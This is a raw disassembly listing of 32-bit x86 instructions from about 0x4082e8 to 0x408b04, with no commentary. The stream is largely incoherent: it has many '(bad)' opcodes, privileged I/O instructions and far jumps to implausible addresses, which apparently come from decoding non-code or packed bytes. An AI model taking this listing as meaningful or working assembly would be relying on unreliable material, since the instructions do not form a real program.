  4082e8:	retf   0x5166
  4082eb:	lods   eax,DWORD PTR ds:[esi]
  4082ec:	jbe    0x4082ad
  4082ee:	jmp    0x4082cf
  4082f0:	dec    ebx
  4082f1:	pop    eax
  4082f2:	xchg   esi,eax
  4082f3:	in     al,dx
  4082f4:	rcl    BYTE PTR fs:[eax+0x78dea9fb],1
  4082fb:	pop    es
  4082fc:	mov    ah,0x5a
  4082fe:	mov    ebx,0x617db4b4
  408303:	mov    ebx,0xea1b3de
  408308:	sbb    BYTE PTR [edx+0x10d6a17c],0xa9
  40830f:	rol    ch,1
  408311:	mov    al,0x45
  408313:	js     0x40834d
  408315:	inc    eax
  408316:	xchg   ebx,eax
  408317:	(bad)  
  408318:	sti    
  408319:	mov    al,ds:0xc25a07d6
  40831e:	xor    edx,DWORD PTR [edi+0x43]
  408321:	(bad)  
  408322:	out    0x8f,eax
  408324:	xor    bh,bh
  408326:	xchg   edi,eax
  408327:	mov    bl,BYTE PTR [esi-0x1f]
  40832a:	xor    BYTE PTR [ecx],0xce
  40832d:	imul   ebp,DWORD PTR [ecx+edx*8-0x6b15a048],0x3a9734ed
  408338:	xor    edx,DWORD PTR [bp+di+0x46ff]
  40833d:	adc    ebp,DWORD PTR [edi+0xf]
  408340:	(bad)
  408343:	push   edx
  408344:	mov    esp,0x6a7b81fb
  408349:	pusha  
  40834a:	pop    edx
  40834b:	sub    DWORD PTR [ebx+0x47cfff3],esi
  408351:	cli    
  408352:	jmp    0x329b:0x617c39eb
  408359:	pop    ebp
  40835a:	or     eax,DWORD PTR [edi]
  40835c:	call   0xbdbd1433
  408361:	sbb    ch,dh
  408363:	scas   eax,DWORD PTR es:[edi]
  408364:	xor    eax,0xf33cc9be
  408369:	pushf  
  40836a:	xor    dl,BYTE PTR [ebx]
  40836c:	or     al,0x9b
  40836e:	and    ebp,ebx
  408370:	inc    ebx
  408371:	adc    DWORD PTR [eax],edx
  408373:	adc    cl,BYTE PTR [edx-0x43]
  408376:	jns    0x4082fe
  408378:	sti    
  408379:	push   ecx
  40837a:	daa    
  40837b:	cmp    BYTE PTR [ebx-0x6a],ch
  40837e:	cmp    eax,0xd49850a
  408383:	call   0x3948:0xdc068ca7
  40838a:	sub    DWORD PTR [eax],esp
  40838c:	scas   al,BYTE PTR es:[edi]
  40838d:	mov    dl,0xe3
  40838f:	or     ecx,0xffffff8e
  408392:	ror    DWORD PTR [edx+0x4405aa80],1
  408398:	(bad)  
  408399:	xchg   ebp,eax
  40839a:	xor    DWORD PTR [ebx],esp
  40839c:	sub    dl,ch
  40839e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40839f:	xchg   ecx,eax
  4083a0:	pop    esp
  4083a1:	in     eax,0xfe
  4083a3:	test   al,0x49
  4083a5:	sub    eax,0x738f42c5
  4083aa:	enter  0x8a20,0xf9
  4083ae:	fs fs iret 
  4083b1:	or     eax,0xc1e5aae
  4083b6:	push   ss
  4083b7:	data16 aaa 
  4083b9:	aam    0xa9
  4083bb:	lods   eax,DWORD PTR ds:[esi]
  4083bc:	add    eax,0xd70465c0
  4083c1:	rcr    BYTE PTR [ecx+eiz*8],1
  4083c4:	or     DWORD PTR [esi-0x50f92ca9],0xfffffffc
  4083cb:	and    edi,DWORD PTR [ebp+0x18]
  4083ce:	or     DWORD PTR [edi+0xfe33721],edx
  4083d4:	mov    al,0x9c
  4083d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083d7:	push   ds
  4083d8:	retf   
  4083d9:	iret   
  4083da:	into   
  4083db:	xor    edi,ebp
  4083dd:	bswap  eax
  4083df:	idiv   dl
  4083e1:	int    0xf9
  4083e3:	cmp    al,0x25
  4083e5:	inc    edx
  4083e6:	data16 arpl cx,si
  4083e9:	call   0xb09b6f48
  4083ee:	jne    0x408406
  4083f0:	or     BYTE PTR [esi+0x6b373b36],0x2d
  4083f7:	jae    0x4083f8
  4083f9:	sub    DWORD PTR [esi+0x3204bff4],edx
  4083ff:	inc    edi
  408400:	fs jle 0x4083a4
  408403:	in     eax,0x4e
  408405:	pop    esi
  408406:	push   edi
  408407:	daa    
  408408:	out    dx,eax
  408409:	sub    dl,BYTE PTR [ebp-0x38]
  40840c:	pushf  
  40840d:	add    BYTE PTR [eax+0x146d5fd8],0x2e
  408414:	mov    ch,0x9f
  408416:	pushf  
  408417:	push   edx
  408418:	in     al,dx
  408419:	mov    ebp,0x5fc3d776
  40841e:	jbe    0x40842f
  408420:	leave  
  408421:	and    ecx,ecx
  408423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408424:	xor    DWORD PTR [edi+0x71b31736],esi
  40842a:	adc    DWORD PTR [ebp-0x3683c5f0],esp
  408430:	cld    
  408431:	int3   
  408432:	push   esp
  408433:	sahf   
  408434:	inc    ebp
  408435:	sti    
  408436:	repz push 0xffffff95
  408439:	rcr    edx,0x4f
  40843c:	mov    WORD PTR [eax+edx*1+0x199019d3],ss
  408443:	fiadd  WORD PTR [edx]
  408445:	mov    ah,0x8
  408447:	adc    ch,al
  408449:	sar    DWORD PTR [esi+ebx*1],1
  40844c:	or     eax,eax
  40844e:	pop    ebx
  40844f:	or     edi,edx
  408451:	cwde   
  408452:	dec    eax
  408453:	call   0xc8b605b1
  408458:	cmp    ecx,eax
  40845a:	iret   
  40845b:	mov    DWORD PTR [edi+0x22ead71d],ebp
  408461:	mov    al,0x25
  408463:	fadd   QWORD PTR [eax+0x1a]
  408466:	xor    BYTE PTR [esi-0x663806ad],bl
  40846c:	sub    al,0x2
  40846e:	mov    esi,0xbd0c8b3e
  408473:	in     al,dx
  408474:	out    0x31,al
  408476:	sti    
  408477:	leave  
  408478:	jle    0x408450
  40847a:	push   ecx
  40847b:	add    BYTE PTR [ecx+edx*8],0xda
  40847f:	mov    DWORD PTR [edi-0xd237091],edi
  408485:	das    
  408486:	sbb    al,0xf0
  408488:	push   ebx
  408489:	nop
  40848a:	cld    
  40848b:	xchg   esi,esi
  40848d:	pop    eax
  40848e:	iret   
  40848f:	mov    WORD PTR [ebp+ebx*2-0x76],?
  408493:	pop    ds
  408494:	leave  
  408495:	stos   BYTE PTR es:[edi],al
  408496:	xchg   ecx,eax
  408497:	js     0x408505
  408499:	add    ah,BYTE PTR [ebp+0x1b3c3a4f]
  40849f:	sub    DWORD PTR [edx],0x40d88a24
  4084a5:	add    al,0x93
  4084a7:	(bad)  
  4084a9:	jge    0x4084d6
  4084ab:	popf   
  4084ac:	(bad)  
  4084ad:	cmp    bh,BYTE PTR [ecx+0x43]
  4084b0:	loop   0x408458
  4084b2:	mov    DWORD PTR [esi+0x61],0x22772c4f
  4084b9:	mov    ch,0xed
  4084bb:	fstp   QWORD PTR [ebp+0x2f973a5f]
  4084c1:	jbe    0x408513
  4084c3:	pop    ecx
  4084c4:	ret    
  4084c5:	jmp    0x84f3:0xcccb3d13
  4084cc:	dec    eax
  4084cd:	mov    eax,edi
  4084cf:	cld    
  4084d0:	cld    
  4084d1:	aas    
  4084d2:	in     al,0x79
  4084d4:	pop    edx
  4084d5:	in     al,0x5d
  4084d7:	dec    ebp
  4084d8:	cmp    esi,DWORD PTR [ecx+ecx*2+0x6a]
  4084dc:	sti    
  4084dd:	sbb    al,0x75
  4084df:	cmp    cl,BYTE PTR [ebx+0x5]
  4084e2:	mov    WORD PTR [edi-0xa],ds
  4084e5:	mov    dl,0xb1
  4084e7:	and    BYTE PTR [edx],cl
  4084e9:	call   0xab4d:0x3aaa45a8
  4084f0:	enter  0xfa54,0x5e
  4084f4:	dec    ebx
  4084f5:	jp     0x4084e0
  4084f7:	mov    eax,ds:0x380e3359
  4084fc:	xor    eax,0xccecc6a3
  408501:	and    edi,DWORD PTR [ecx]
  408503:	retf   
  408504:	or     ecx,edi
  408506:	mov    edi,0x4dee78bb
  40850b:	mov    ebx,0x395de1ec
  408510:	fdiv   QWORD PTR [edi+0x57]
  408513:	retf   
  408514:	xor    ecx,DWORD PTR [eax+0x33]
  408517:	xchg   esp,eax
  408518:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40851a:	adc    al,0xb8
  40851c:	or     BYTE PTR [edi+0x56005900],bl
  408522:	(bad)  
  408523:	mov    ah,0xec
  408525:	aaa    
  408526:	jmp    0x7b1fcbce
  40852b:	inc    edx
  40852c:	dec    edx
  40852d:	jae    0x408571
  40852f:	loope  0x408546
  408531:	push   es
  408532:	leave  
  408533:	adc    bh,0x2e
  408536:	inc    esp
  408537:	frstor [esp+eiz*4-0x40]
  40853b:	jns    0x4084d0
  40853d:	mov    edi,0xad3de020
  408542:	repnz fcom QWORD PTR [ecx-0x3376a55]
  408549:	das    
  40854a:	hlt    
  40854b:	jbe    0x4085aa
  40854d:	cmp    al,0x82
  40854f:	fsub   QWORD PTR ss:[ecx+0x7e1e8d13]
  408556:	xchg   bl,bh
  408558:	(bad)  
  408559:	fbld   TBYTE PTR [eax+0x65]
  40855c:	leave  
  40855d:	sub    esi,edi
  40855f:	ds xchg edx,eax
  408561:	std    
  408562:	shl    BYTE PTR [edx+0x7663a94a],0xe5
  408569:	jecxz  0x4084f8
  40856b:	shl    DWORD PTR [esi],0xb8
  40856e:	and    eax,0x12cdb877
  408573:	retf   0x777d
  408576:	sub    ch,BYTE PTR [ebx-0x6d]
  408579:	imul   BYTE PTR ds:0x82810fc4
  40857f:	or     ecx,eax
  408581:	push   eax
  408582:	cmp    eax,0x82494cab
  408587:	mov    ah,0x36
  408589:	loope  0x408524
  40858b:	xchg   esp,eax
  40858c:	(bad)  
  40858d:	jmp    0x4085aa
  40858f:	pop    ebx
  408590:	cmp    BYTE PTR [eax+ecx*1],bh
  408593:	push   es
  408594:	mov    dl,0x12
  408596:	jns    0x4085ec
  408598:	cmp    BYTE PTR [ebx-0x28],dl
  40859b:	cwde   
  40859c:	es xchg esi,eax
  40859e:	mov    edx,0xe08a98ac
  4085a3:	js     0x3896eaa
  4085a9:	add    BYTE PTR [eax],al
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0xda0c8bf9
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x4085dc
  4085c4:	dec    edx
  4085c5:	sbb    DWORD PTR [ebx],edi
  4085c7:	jns    0x4085a2
  4085c9:	(bad)  
  4085cb:	jmp    0xc6d42aea
  4085d0:	popf   
  4085d1:	lahf   
  4085d2:	add    BYTE PTR [esi-0x48],0x7
  4085d6:	pushf  
  4085d7:	lods   eax,DWORD PTR ds:[esi]
  4085d8:	(bad)  
  4085d9:	inc    ecx
  4085da:	shl    DWORD PTR [ebp+0x41],1
  4085dd:	ja     0x408637
  4085df:	std    
  4085e0:	push   ebx
  4085e1:	inc    esi
  4085e2:	cdq    
  4085e3:	mov    ebx,0x216fe1e1
  4085e8:	push   edi
  4085e9:	mov    ds:0xfdc31dbb,al
  4085ee:	jne    0x4085d1
  4085f0:	push   es
  4085f1:	sub    al,0xa
  4085f3:	jmp    0x7d96:0xbfa6d5fd
  4085fa:	(bad)  
  4085fb:	stos   DWORD PTR es:[edi],eax
  4085fc:	fisubr WORD PTR [ecx]
  4085fe:	in     eax,dx
  4085ff:	inc    edx
  408600:	retf   0x98d1
  408603:	mov    ch,0xf4
  408605:	sbb    DWORD PTR [ebp+0x543906a9],edx
  40860b:	jbe    0x40867c
  40860d:	add    al,0x53
  40860f:	retf   0xc956
  408612:	out    0x95,eax
  408614:	inc    BYTE PTR [esi+0x6f]
  408617:	ds data16 aas 
  40861a:	or     edx,DWORD PTR [eax]
  40861c:	rcl    DWORD PTR [ebp+0x765bb081],1
  408622:	dec    ebp
  408623:	mov    bh,0x63
  408625:	xor    ebx,DWORD PTR [eax]
  408627:	daa    
  408628:	and    BYTE PTR [ebx+0x7a],ch
  40862b:	or     edx,DWORD PTR [edx+0x9]
  40862e:	sub    eax,0xf867307c
  408633:	sub    esi,ebx
  408635:	jmp    0x4085e8
  408637:	leave  
  408638:	out    0xd1,eax
  40863a:	xchg   edi,eax
  40863b:	mov    dh,0xee
  40863d:	push   ebp
  40863e:	ret    0x39a6
  408641:	fwait
  408642:	cld    
  408643:	(bad)  
  408644:	inc    eax
  408645:	push   0xa3a762c4
  40864a:	mov    ds:0x808ae23a,al
  40864f:	dec    eax
  408650:	iret   
  408651:	adc    BYTE PTR [edi],dl
  408653:	(bad)
  408656:	sbb    edi,ebp
  408658:	adc    dh,BYTE PTR [ebx+eiz*1+0x51]
  40865c:	mov    ah,0x88
  40865e:	push   cs
  40865f:	retf   
  408660:	call   0x3987:0x5e1eaea3
  408667:	sbb    al,BYTE PTR [ebx-0x14]
  40866a:	out    dx,eax
  40866b:	mov    dh,0xf5
  40866d:	mov    WORD PTR [ecx],?
  40866f:	fwait
  408670:	xor    bh,dh
  408672:	int    0x29
  408674:	push   edi
  408675:	mov    ch,dh
  408677:	repnz pop edx
  408679:	les    ebx,FWORD PTR [esi-0x2e51d76c]
  40867f:	xchg   edi,eax
  408680:	xor    esi,DWORD PTR [ebx-0xa]
  408683:	dec    esp
  408684:	or     ebx,0xffffffe3
  408687:	sbb    eax,0x8b249cc1
  40868c:	sub    BYTE PTR [ecx],bl
  40868e:	jbe    0x408688
  408690:	not    BYTE PTR [esi]
  408692:	(bad)  
  408693:	int    0x6
  408695:	push   ecx
  408696:	test   ch,0xb9
  408699:	jne    0x4086f7
  40869b:	xchg   edi,eax
  40869c:	pop    ebp
  40869d:	pop    es
  40869e:	test   DWORD PTR [eax-0x14],edi
  4086a1:	sub    DWORD PTR [ebp+0x65],esp
  4086a4:	mov    ds:0x85bce2d4,eax
  4086a9:	nop
  4086aa:	push   DWORD PTR [eax]
  4086ac:	add    DWORD PTR [esi+ebx*1+0x44],ebx
  4086b0:	dec    ebx
  4086b1:	dec    esi
  4086b2:	inc    ebx
  4086b3:	push   esp
  4086b4:	or     dl,BYTE PTR [edx]
  4086b6:	jg     0x40865c
  4086b8:	scas   al,BYTE PTR es:[edi]
  4086b9:	jae    0x408679
  4086bb:	aad    0xb0
  4086bd:	inc    ebx
  4086be:	push   ebx
  4086bf:	in     eax,0x19
  4086c1:	mov    ch,0x64
  4086c3:	cli    
  4086c4:	mov    ds:0xb7d55475,eax
  4086c9:	rcr    dh,cl
  4086cb:	sbb    eax,DWORD PTR [ecx+0x4547709a]
  4086d1:	jae    0x4086b8
  4086d3:	aaa    
  4086d4:	mov    eax,ds:0x926ac699
  4086d9:	ss sub al,0x4c
  4086dc:	sbb    ebp,DWORD PTR [edx-0x359fe4c1]
  4086e2:	jmp    0x40867b
  4086e4:	mov    dh,0xa5
  4086e6:	sbb    DWORD PTR [esi+0x73],ecx
  4086e9:	in     eax,0xae
  4086eb:	in     eax,dx
  4086ec:	jne    0x4086f2
  4086ee:	inc    esi
  4086ef:	dec    esp
  4086f0:	sub    al,0x3f
  4086f2:	sub    BYTE PTR [edx],dh
  4086f4:	jecxz  0x4086cf
  4086f6:	shl    DWORD PTR [edi-0x54],1
  4086f9:	jmp    0x4086b7
  4086fb:	sar    edi,0xae
  4086fe:	adc    al,0x91
  408700:	mov    esi,esi
  408702:	call   0x9b74:0x2f193006
  408709:	sub    cl,dl
  40870b:	xor    al,0xb7
  40870d:	out    dx,al
  40870e:	ds jmp 0x408692
  408711:	and    DWORD PTR [ecx+eiz*1+0x13bedbb5],esi
  408718:	cmp    DWORD PTR [edx],edi
  40871a:	dec    DWORD PTR [edx-0x48]
  40871d:	mov    ah,0xda
  40871f:	les    esi,FWORD PTR [ecx]
  408721:	inc    edi
  408722:	nop
  408723:	out    dx,eax
  408724:	xchg   DWORD PTR [edx],esi
  408726:	mov    eax,ds:0x622bd912
  40872b:	mov    BYTE PTR [ebx],dl
  40872d:	shr    DWORD PTR [edi+0x74],1
  408730:	lods   eax,DWORD PTR ds:[esi]
  408731:	add    eax,0x219a591
  408736:	les    esp,FWORD PTR [edi]
  408738:	xlat   BYTE PTR ds:[ebx]
  408739:	lahf   
  40873a:	das    
  40873b:	and    esp,0x2f145666
  408741:	jmp    FWORD PTR [esp+eax*2-0x46]
  408745:	les    ebx,FWORD PTR [ebx+0x66]
  408748:	in     eax,0x72
  40874a:	jb     0x40872e
  40874c:	dec    edx
  40874d:	call   0x753be986
  408752:	jp     0x408775
  408754:	popa   
  408755:	mov    ch,0x75
  408757:	push   ebp
  408758:	mov    al,0xac
  40875a:	les    ebx,FWORD PTR [esi+0x64c83d5a]
  408760:	cwde   
  408761:	adc    DWORD PTR [edi-0x6e],esi
  408764:	fwait
  408765:	pop    eax
  408766:	lods   eax,DWORD PTR ds:[esi]
  408767:	sahf   
  408768:	fsub   QWORD PTR [ecx+0x3d]
  40876b:	mov    eax,0xe2f93a5f
  408770:	test   DWORD PTR [ecx-0x62e4d62d],esi
  408776:	inc    edi
  408777:	jle    0x408798
  408779:	mov    al,ds:0x6e5ff3ad
  40877e:	aas    
  40877f:	jg     0x408760
  408781:	xor    al,ch
  408783:	mov    ch,ch
  408785:	pop    ebp
  408786:	pop    es
  408787:	adc    eax,eax
  408789:	push   es
  40878a:	or     esp,DWORD PTR [edi]
  40878c:	fst    QWORD PTR fs:[esi-0x6c8b6124]
  408793:	pcmpgtb mm1,QWORD PTR [esi-0x1b]
  408797:	cmp    cl,BYTE PTR [esi-0xb000080]
  40879d:	inc    ebx
  40879e:	daa    
  40879f:	push   ecx
  4087a0:	dec    edi
  4087a1:	xchg   BYTE PTR [esi+eax*8-0x182fc4ed],dh
  4087a8:	pop    edi
  4087a9:	mov    ah,0xd8
  4087ab:	xchg   edi,eax
  4087ac:	sahf   
  4087ad:	inc    esp
  4087ae:	pop    edx
  4087af:	repz add eax,0xcf7690ab
  4087b5:	or     dh,BYTE PTR [edx-0x20]
  4087b8:	or     ebp,eax
  4087ba:	es sahf 
  4087bc:	xor    BYTE PTR [ebp+0x64],dl
  4087bf:	xlat   BYTE PTR ds:[ebx]
  4087c0:	lods   al,BYTE PTR gs:[esi]
  4087c2:	xor    eax,0x607804c2
  4087c7:	jle    0x40882f
  4087c9:	pop    es
  4087ca:	cmp    bl,ah
  4087cc:	or     eax,edx
  4087ce:	ret    
  4087cf:	push   edi
  4087d0:	je     0x40875d
  4087d2:	mov    ds:0xa42d4bfb,eax
  4087d7:	xor    DWORD PTR [esi],0x103a639e
  4087dd:	push   edi
  4087de:	and    ebp,DWORD PTR [ebx-0x70]
  4087e1:	stos   BYTE PTR es:[edi],al
  4087e2:	mov    WORD PTR [esi+0x10],gs
  4087e5:	adc    eax,0xacdd5bb8
  4087ea:	sub    BYTE PTR [eax+0x11],dl
  4087ed:	leave  
  4087ee:	inc    eax
  4087ef:	pop    es
  4087f0:	sbb    ah,0x92
  4087f3:	ret    0xbba2
  4087f6:	(bad)  
  4087f7:	push   ds
  4087f8:	or     al,0x37
  4087fa:	pop    ecx
  4087fb:	mov    ah,0x77
  4087fd:	into   
  4087fe:	fcomp  DWORD PTR [ebx]
  408800:	add    al,BYTE PTR [ebp+0x4494c4d4]
  408806:	js     0x40878f
  408808:	imul   ebx,ecx,0x23
  40880b:	dec    esp
  40880c:	push   ss
  40880d:	pusha  
  40880e:	pop    ebx
  40880f:	(bad)  
  408811:	dec    esi
  408812:	xor    eax,0xeba665fa
  408817:	call   0xa9f71e98
  40881c:	dec    ecx
  40881d:	and    BYTE PTR [eax+ebp*8-0x2e8ab7f4],dl
  408824:	fdiv   QWORD PTR [esi-0x54e01a29]
  40882a:	mov    edi,0xcabf5aff
  40882f:	ds test eax,0x8bf8b196
  408835:	fist   WORD PTR [ebp+0x1e]
  408838:	inc    esi
  408839:	adc    al,0xc0
  40883b:	fcomp  QWORD PTR [edi-0x5aa9c0e7]
  408841:	mov    edi,0xa9f12f6f
  408846:	push   ecx
  408847:	jnp    0x408870
  408849:	cmp    DWORD PTR ds:[esi-0x2de7eba5],esi
  408850:	dec    esi
  408851:	(bad)  
  408852:	stc    
  408853:	shr    DWORD PTR ds:0xb267b5cf,0x7a
  40885a:	scas   eax,DWORD PTR es:[edi]
  40885b:	or     eax,0xc6867c70
  408860:	jne    0x408810
  408862:	out    dx,al
  408863:	cmc    
  408864:	iret   
  408865:	and    eax,0x5f979de
  40886a:	ja     0x408870
  40886c:	mov    esp,0xb1d8b3e1
  408872:	enter  0x7b39,0xd3
  408876:	push   edx
  408877:	cli    
  408878:	push   esi
  408879:	inc    esp
  40887a:	jp     0x40889f
  40887c:	push   0x27061255
  408881:	mov    esp,DWORD PTR [edi]
  408883:	inc    ecx
  408884:	mov    al,ds:0xf039d4f1
  408889:	dec    esi
  40888a:	push   ebp
  40888b:	cs movaps xmm6,xmm0
  40888f:	dec    ebx
  408890:	xor    DWORD PTR [edi-0x471700b1],ecx
  408896:	or     eax,0x1604e48f
  40889b:	pop    esp
  40889c:	xchg   ebp,eax
  40889d:	mov    dh,0x67
  40889f:	sub    cl,dl
  4088a1:	xor    al,0xa2
  4088a3:	clc    
  4088a4:	sub    cl,cl
  4088a6:	in     eax,dx
  4088a7:	imul   eax,eax,0x14
  4088aa:	mov    bh,0xdc
  4088ac:	jmp    0x408848
  4088ae:	cmc    
  4088af:	add    eax,0xd8302e1f
  4088b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088b5:	mov    eax,0xe9dd00d2
  4088ba:	mov    dl,0x7d
  4088bc:	repz sub ah,BYTE PTR [eax+ebx*1-0x35b6698a]
  4088c4:	ins    DWORD PTR es:[edi],dx
  4088c5:	mov    bl,bl
  4088c7:	xlat   BYTE PTR ds:[ebx]
  4088c8:	xchg   DWORD PTR [ebx+eax*2-0x700e9126],esi
  4088cf:	xor    eax,ebp
  4088d1:	repz ud1 esp,DWORD PTR [esi+0x5ea2a170]
  4088d9:	fs dec eax
  4088db:	or     eax,0xf948ba4
  4088e0:	ja     0x408958
  4088e2:	scas   eax,DWORD PTR es:[edi]
  4088e3:	push   esi
  4088e4:	lds    edx,FWORD PTR [ebx-0x5b2f559f]
  4088ea:	xchg   ecx,eax
  4088eb:	xor    eax,0x58860ecc
  4088f0:	(bad)  
  4088f1:	lahf   
  4088f2:	inc    ebx
  4088f3:	lea    eax,[ebp-0x8]
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp+0x70435cff],cl
  40890c:	mov    WORD PTR [ebx-0x6a],?
  40890f:	xchg   edi,eax
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x4088bc
  408918:	jne    0x408982
  40891a:	in     al,0x66
  40891c:	cmc    
  40891d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40891e:	and    al,bh
  408920:	in     eax,dx
  408921:	mov    eax,ds:0x83622ff7
  408926:	sbb    dh,BYTE PTR [ebx+ebp*8]
  408929:	sbb    al,0x9a
  40892b:	dec    edx
  40892c:	jge    0x40893f
  40892e:	sub    DWORD PTR [edi],esi
  408930:	pop    esp
  408931:	xchg   esi,eax
  408932:	clc    
  408933:	xchg   esi,eax
  408934:	mov    bh,BYTE PTR [eax+0x72a8163f]
  40893a:	and    DWORD PTR [esi-0x2c],ebp
  40893d:	jl     0x40890e
  40893f:	pop    eax
  408940:	iret   
  408941:	hlt    
  408942:	(bad)  
  408944:	cdq    
  408945:	(bad)  ds:0x147605a1
  40894b:	xor    dh,0x83
  40894e:	adc    eax,0x663555
  408953:	mov    ds:0x91e676e1,eax
  408958:	syscall 
  40895a:	enter  0x4487,0xa0
  40895e:	xor    bh,BYTE PTR [edx+0x44b8aecb]
  408964:	sub    ebp,edi
  408966:	pop    ebx
  408967:	ins    DWORD PTR es:[edi],dx
  408968:	sub    al,0x29
  40896a:	sbb    eax,0x151dc67d
  40896f:	fld    st(7)
  408971:	pop    eax
  408972:	fist   DWORD PTR [edi+0x6e]
  408975:	mov    esp,0x166f1af2
  40897a:	inc    ebp
  40897b:	adc    ch,cl
  40897d:	(bad)  [edi-0x49e76f87]
  408983:	sub    DWORD PTR [ebx-0x3a],esi
  408986:	jne    0x408992
  408988:	jmp    0x40898b
  40898a:	(bad)  
  40898b:	inc    edx
  40898c:	clc    
  40898d:	repz push cs
  40898f:	jecxz  0x4089b4
  408991:	aas    
  408992:	fmul   QWORD PTR [esi]
  408994:	xlat   BYTE PTR ds:[ebx]
  408995:	xor    bl,BYTE PTR [ecx]
  408997:	pop    ebp
  408998:	xchg   esi,eax
  408999:	out    dx,al
  40899a:	sar    dl,0xd
  40899d:	inc    ebp
  40899e:	dec    esi
  40899f:	mov    eax,0xb247ce49
  4089a4:	jmp    0x7647:0x97741f77
  4089ab:	rol    cl,0x5e
  4089ae:	sub    DWORD PTR [eax],ecx
  4089b0:	dec    ebp
  4089b1:	push   ss
  4089b2:	add    dl,BYTE PTR [ecx+0x720b704d]
  4089b8:	sahf   
  4089b9:	(bad)  
  4089ba:	mov    ebx,0x1f3069c5
  4089bf:	cmc    
  4089c0:	(bad)  
  4089c1:	into   
  4089c2:	push   ds
  4089c3:	dec    esp
  4089c4:	mov    esp,0x7b75d53
  4089c9:	xor    DWORD PTR [ebx+0x3d255b3d],edi
  4089cf:	mov    ebx,0xb70b3cfb
  4089d4:	not    dh
  4089d6:	mov    ?,WORD PTR [edx+0x23002c1c]
  4089dc:	xchg   edx,eax
  4089dd:	and    BYTE PTR [edx+0x7230b738],dl
  4089e3:	aaa    
  4089e4:	xor    al,0x10
  4089e6:	stos   DWORD PTR es:[edi],eax
  4089e7:	xor    DWORD PTR [ecx],0xffffffea
  4089ea:	sub    ah,BYTE PTR [ebx+ecx*2+0x3]
  4089ee:	dec    eax
  4089ef:	dec    esi
  4089f0:	and    dh,BYTE PTR [edi-0x29642c92]
  4089f6:	dec    ecx
  4089f7:	dec    esi
  4089f8:	add    eax,DWORD PTR [edx]
  4089fa:	or     eax,DWORD PTR [edx]
  4089fc:	das    
  4089fd:	inc    edx
  4089fe:	jmp    0x5d35f404
  408a03:	inc    ecx
  408a04:	retf   
  408a05:	aam    0x3c
  408a07:	fcomp  DWORD PTR [edi-0x1b]
  408a0a:	sahf   
  408a0b:	sub    eax,0xb8ec1645
  408a10:	dec    esp
  408a11:	sahf   
  408a12:	jne    0x408a53
  408a14:	je     0x408a1f
  408a16:	jmp    0x1f03e181
  408a1b:	mov    ebp,0x7cd32403
  408a20:	clc    
  408a21:	jo     0x408a71
  408a23:	jg     0x408a41
  408a25:	sub    al,0x5
  408a27:	int    0xad
  408a29:	mov    ebp,0xe3e4cf5
  408a2e:	and    eax,0x36372b6b
  408a33:	add    BYTE PTR [esi+0x68a325d9],dl
  408a39:	stos   BYTE PTR es:[edi],al
  408a3a:	add    eax,0xda1622b7
  408a3f:	les    edi,FWORD PTR [ecx-0x4dc02581]
  408a45:	fnstcw WORD PTR [esi+0x32f60178]
  408a4b:	test   BYTE PTR ds:0x22357c1b,dh
  408a51:	popa   
  408a52:	mov    eax,ds:0x41cfb31d
  408a57:	push   esp
  408a58:	mov    edi,0x32555bbd
  408a5d:	or     cl,0x8e
  408a60:	mov    esp,ebp
  408a62:	jmp    0x8f1e0c45
  408a67:	xor    ebx,DWORD PTR [edx-0x7801da3f]
  408a6d:	fisttp QWORD PTR [eax-0x60]
  408a70:	in     eax,dx
  408a71:	add    edx,DWORD PTR [edx+0x5f9adde]
  408a77:	push   ss
  408a78:	jl     0x408a05
  408a7a:	inc    edx
  408a7b:	add    ah,al
  408a7d:	retf   
  408a7e:	add    ecx,DWORD PTR [edx-0x77]
  408a81:	repz (bad) 
  408a83:	and    ch,BYTE PTR [ecx]
  408a85:	inc    esp
  408a86:	jg     0x408a40
  408a88:	dec    esi
  408a89:	sbb    edx,DWORD PTR [ecx-0xb]
  408a8c:	push   0x0
  408a8e:	xchg   DWORD PTR [ebx+0x23c88697],ecx
  408a94:	jns    0x408a89
  408a96:	sub    al,BYTE PTR [eax+0x41]
  408a99:	sbb    DWORD PTR [esi+edi*2],esp
  408a9c:	ret    0x5ddb
  408a9f:	cmp    BYTE PTR [ebp-0x1c],cl
  408aa2:	dec    BYTE PTR [edi]
  408aa4:	xor    esp,DWORD PTR [edx+0x7ff96f74]
  408aaa:	div    dl
  408aac:	je     0x408aaf
  408aae:	xor    eax,0x8e687493
  408ab3:	(bad)  [edi]
  408ab5:	add    DWORD PTR [ecx-0x17dc9dc7],ecx
  408abb:	(bad)  [edi+0x130e6455]
  408ac1:	pop    edi
  408ac2:	ins    DWORD PTR es:[edi],dx
  408ac3:	xlat   BYTE PTR ds:[ebx]
  408ac4:	(bad)  
  408ac6:	nop
  408ac7:	inc    ebx
  408ac8:	outs   dx,DWORD PTR ds:[esi]
  408ac9:	adc    DWORD PTR [esi+eiz*2-0x5bcdb27d],esi
  408ad0:	inc    eax
  408ad1:	inc    edi
  408ad2:	mov    eax,0x9f3f7313
  408ad7:	sahf   
  408ad8:	vprotw ymm1,[ecx+0x6],xmm6
  408ade:	int    0x19
  408ae0:	in     al,dx
  408ae1:	xor    eax,0xeb6639f7
  408ae6:	mov    al,0x3b
  408ae8:	fsub   DWORD PTR [edx+edi*1+0x565a4aa7]
  408aef:	fbstp  TBYTE PTR [ebp-0x195263c5]
  408af5:	sbb    ebx,DWORD PTR [esi+0x5cd9a754]
  408afb:	or     eax,ebp
  408afd:	mov    al,ds:0xe961bb54
  408b02:	shr    al,cl
  408b04:	push   ds
